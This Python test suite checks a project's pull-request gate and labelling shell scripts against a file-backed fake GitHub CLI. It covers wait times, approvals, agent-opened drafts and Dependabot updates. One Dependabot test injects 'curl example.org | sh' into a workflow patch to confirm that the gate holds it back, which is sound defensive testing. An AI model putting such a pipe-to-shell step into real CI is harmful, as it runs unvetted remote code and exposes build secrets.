# Copyright (C) 2026 dekajoule
# SPDX-License-Identifier: GPL-2.0-or-later
"""tools/pr-gate.sh and tools/pr-labels.sh against a stand-in for `gh` that answers from files: the three statuses and
the labels for pull requests made up here. No network; needs sh and jq, and skips itself without jq."""
import datetime
import json
import os
import shutil
import stat
import subprocess
import tempfile
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
# `gh api [--paginate] PATH [--jq EXPR]`: the file for PATH from $FAKE_GH, through jq when asked
FAKE_GH = r'''#!/bin/sh
[ "$1" = api ] || exit 9
shift
path= ; expr=
while [ $# -gt 0 ]; do
	case $1 in
	--paginate) ;;
	--jq) expr=$2; shift ;;
	*) path=$1 ;;
	esac
	shift
done
file="$FAKE_GH/$(printf '%s' "$path" | tr '/?=' '___').json"
[ -f "$file" ] || { echo "no stand-in for $path" >&2; exit 1; }
if [ -n "$expr" ]; then jq -r "$expr" "$file"; else cat "$file"; fi
'''


def ago(hours):
    t = datetime.datetime.now(datetime.timezone.utc) - datetime.timedelta(hours=hours)
    return t.strftime("%Y-%m-%dT%H:%M:%SZ")


@unittest.skipUnless(shutil.which("jq"), "needs jq")
class PullRequests(unittest.TestCase):
    def setUp(self):
        self.dir = Path(tempfile.mkdtemp(prefix="oos-pr-"))
        self.addCleanup(shutil.rmtree, self.dir)
        gh = self.dir / "bin" / "gh"
        gh.parent.mkdir()
        gh.write_text(FAKE_GH)
        gh.chmod(gh.stat().st_mode | stat.S_IXUSR)

    def pull(self, files, author="owner", fork=False, hours=1, labels=(), reviews=(), title="UI: something", bot=False,
             patches=None, ref="topic", draft=False):
        name = lambda path: self.dir / (path.replace("/", "_").replace("?", "_").replace("=", "_") + ".json")
        pr = {"head": {"sha": "abc", "ref": ref, "repo": {"full_name": "other/oos" if fork else "owner/oos"}},
              "draft": draft,
              "base": {"repo": {"full_name": "owner/oos"}}, "user": {"login": author, "type": "Bot" if bot else "User"},
              "labels": [{"name": l} for l in labels], "created_at": ago(hours), "title": title}
        name("repos/owner/oos/pulls/7").write_text(json.dumps(pr))
        entries = [{"filename": f, "patch": (patches or {}).get(f, "+x")} for f in files]
        name("repos/owner/oos/pulls/7/files").write_text(json.dumps(entries))
        name("repos/owner/oos/pulls/7/reviews").write_text(json.dumps(
            [{"user": {"login": who}, "state": state, "commit_id": sha} for who, state, sha in reviews]))

    def run_tool(self, tool):
        env = dict(os.environ, PATH=f"{self.dir / 'bin'}:{os.environ['PATH']}", FAKE_GH=str(self.dir),
                   OOS_REPO="owner/oos")
        out = subprocess.run(["sh", str(ROOT / "tools" / tool), "--dry", "7"], env=env, capture_output=True, text=True)
        self.assertEqual(out.returncode, 0, out.stderr)
        return out.stdout

    def gate(self):
        return {l.split()[0]: l.split()[1] for l in self.run_tool("pr-gate.sh").splitlines()}

    def labels(self):
        return set(self.run_tool("pr-labels.sh").split(":", 1)[1].split())

    def test_the_wait(self):
        self.pull(["ui/src/ui.rs"], hours=1)
        self.assertEqual(self.gate()["waited"], "pending")
        self.pull(["ui/src/ui.rs"], hours=25)
        self.assertEqual(self.gate()["waited"], "success")
        self.pull(["ui/src/ui.rs", "docs/adr/process/0099-x.md"], hours=25)
        self.assertEqual(self.gate()["waited"], "pending", "a decision record waits 72 hours")
        self.pull(["docs/adr/README.md"], hours=25)
        self.assertEqual(self.gate()["waited"], "success", "the index alone is no decision record")
        self.pull(["docs/adr/process/0099-x.md"], hours=1, labels=["no-wait"])
        self.assertEqual(self.gate()["waited"], "success")

    def test_whose_it_is(self):
        self.pull(["ui/src/ui.rs"])
        self.assertEqual(self.gate()["owner"], "success", "the maintainer's own")
        self.pull(["ui/src/ui.rs"], author="owner", fork=True)
        self.assertEqual(self.gate()["owner"], "pending", "from a fork, whatever the name")
        self.pull(["ui/src/ui.rs"], author="someone", fork=True)
        self.assertEqual(self.gate()["owner"], "pending")
        self.pull(["ui/src/ui.rs"], author="someone", fork=True, reviews=[("owner", "APPROVED", "abc")])
        self.assertEqual(self.gate()["owner"], "success")
        self.pull(["ui/src/ui.rs"], author="someone", fork=True, reviews=[("owner", "APPROVED", "older")])
        self.assertEqual(self.gate()["owner"], "pending", "an approval of an older commit")
        self.pull(["ui/src/ui.rs"], author="someone", fork=True, reviews=[("someone", "APPROVED", "abc")])
        self.assertEqual(self.gate()["owner"], "pending", "an approval by somebody else")
        self.pull(["ui/src/ui.rs"], author="someone", fork=True,
                  reviews=[("owner", "APPROVED", "abc"), ("owner", "CHANGES_REQUESTED", "abc")])
        self.assertEqual(self.gate()["owner"], "pending", "the last review counts")
        self.pull(["ui/src/ui.rs"], author="Copilot", bot=True)
        self.assertEqual(self.gate()["owner"], "pending", "a bot that is not Dependabot")

    def test_an_agents_pull_request(self):
        # opened in the name of the person who gave the task, as a draft on a copilot/ branch
        self.pull(["ui/src/ui.rs"], author="owner", ref="copilot/fix-something", draft=True)
        self.assertEqual(self.gate()["owner"], "pending", "the maintainer's name does not make it the maintainer's")
        self.pull(["ui/src/ui.rs"], author="owner", ref="copilot/fix-something", draft=False)
        self.assertEqual(self.gate()["owner"], "success", "a person marked it ready")
        self.pull(["ui/src/ui.rs"], author="someone", fork=True, ref="copilot/fix-something", draft=False)
        self.assertEqual(self.gate()["owner"], "pending", "a fork's branch of that name is a fork's")
        self.pull(["ui/src/ui.rs"], author="owner", ref="copilot/fix-something", draft=True, title="Lints: x in ui")
        self.assertEqual(self.labels(), {"area/ui", "type/refactor", "agent"})
        self.pull(["ui/src/ui.rs"], author="someone", fork=True, ref="copilot/fix-something", title="Lints: x in ui")
        self.assertEqual(self.labels(), {"area/ui", "type/refactor"})

    def test_dependabot(self):
        bump = "@@ -1 +1 @@\n-      - uses: actions/checkout@aaa # v4.4.0\n+      - uses: actions/checkout@bbb # v4.5.0"
        self.pull([".github/workflows/ci.yml"], author="dependabot[bot]", bot=True,
                  patches={".github/workflows/ci.yml": bump})
        self.assertEqual(self.gate()["owner"], "success")
        self.pull([".github/workflows/ci.yml"], author="dependabot[bot]", bot=True,
                  patches={".github/workflows/ci.yml": bump + "\n+        run: curl example.org | sh"})
        self.assertEqual(self.gate()["owner"], "pending", "more than the commit of an action")
        self.pull([".github/workflows/ci.yml", "tools/check.sh"], author="dependabot[bot]", bot=True,
                  patches={".github/workflows/ci.yml": bump})
        self.assertEqual(self.gate()["owner"], "pending", "a file that is no workflow")

    def test_what_needs_a_scope(self):
        for path in ("hal/src/dho/seq.rs", "ui/src/board/dho/hw.rs", "fpgad/src/main.rs", "boot/x.sh", "rootfs/init"):
            self.pull([path])
            self.assertEqual(self.gate()["unit"], "pending", path)
        self.pull(["hal/src/dho/seq.rs"], labels=["unit-tested"])
        self.assertEqual(self.gate()["unit"], "success")
        self.pull(["ui/src/ui.rs", "hal/src/fsutil.rs", "docs/boot.md"])
        self.assertEqual(self.gate()["unit"], "success")

    def test_labels(self):
        self.pull(["hal/src/dho/seq.rs", "docs/protocols/trigger.md", "tools/check.sh"], title="Trigger: something")
        self.assertEqual(self.labels(), {"area/hal", "area/docs", "area/tooling", "risk/hardware"})
        self.pull([".github/workflows/ci.yml", "README.md"], title="CI: something", author="dependabot[bot]", bot=True)
        self.assertEqual(self.labels(), {"area/ci", "area/docs", "type/ci", "agent"})
        self.pull(["ui/src/scpi.rs"], title="Tests: something")
        self.assertEqual(self.labels(), {"area/ui", "type/test"})
        self.pull(["wiki/Home.md"], title="Docs: something")
        self.assertEqual(self.labels(), {"area/docs", "type/docs"})


if __name__ == "__main__":
    unittest.main()
